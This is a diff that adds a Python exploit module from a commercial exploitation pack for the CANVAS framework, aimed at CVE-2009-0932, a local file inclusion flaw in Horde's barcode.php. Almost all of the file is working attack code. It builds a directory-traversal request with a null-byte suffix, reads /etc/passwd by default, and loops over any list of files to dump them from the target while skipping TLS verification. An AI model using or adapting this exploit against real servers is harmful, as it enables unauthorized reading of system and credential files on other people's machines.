@@ -1,0 +1,132 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys, time, os
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO
+
+NAME = "d2sec_horde"
+VERSION = "0.1"
+DESCRIPTION = "Horde Horde_Image::factory driver Argument LFI Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+NOTES="""
+Argument flist: specify a file containing a list of files to dump
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "< 3.3.2"
+DOCUMENTATION["Date public"] = "2011/02/10"
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-0932"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0932"
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""
+    self.port = 80 
+    self.fname = '/etc/passwd' 
+    self.flist = ""
+    self.https = 0
+    self.name = NAME
+	
+  def display_file(self, fname):
+    buf = ''
+    for c in fname:
+      if c == '/' and fname[0] == c:
+        buf += '/'
+      elif c == '/':
+        buf += '/./'
+      else:
+        buf += c
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return ''
+    try:
+      proto = 'http'
+      c = pycurl.Curl()
+      if self.https:
+        proto = 'https'
+      c.setopt(pycurl.URL, '%s://%s/horde/util/barcode.php?type=../../../../../../../../../../..%s%%00&cmd=id' % (proto, self.host, buf))
+      c.setopt(c.WRITEFUNCTION, content.write)
+      c.setopt(c.TIMEOUT, 15)
+      if self.https:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    return content.getvalue()
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.fname = self.argsDict.get("fname",self.fname)
+    self.flist = self.argsDict.get("flist",self.flist)
+    self.https = int(self.argsDict.get("https",self.https))
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    if len(self.fname) > 0 and len(self.flist) > 0:
+      self.log('[D2] You must only specify a file or a list of files')
+      return 0
+    flist = []
+    if len(self.fname) > 0:
+      flist.append(self.fname)
+    elif len(self.flist) > 0:
+      try:
+        ftemp = open(self.flist, "r").readlines()
+      except:
+        self.log("[D2] Can't find %s" % self.flist)
+        self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME,self.host,self.port))
+        return 0
+      for f in ftemp:
+        f = f.strip()
+        flist.append(f)
+    else:
+      self.log('[D2] No file or list of files specified')
+      self.setInfo('%s attacking %s:%d - failed' % (NAME,self.host,self.port))
+      return 0
+    for f in flist:
+      self.log('[#] %s' % f)
+      self.log(self.display_file(f))
+      self.log('\n')
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O fname:<path> -O flist:<path>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
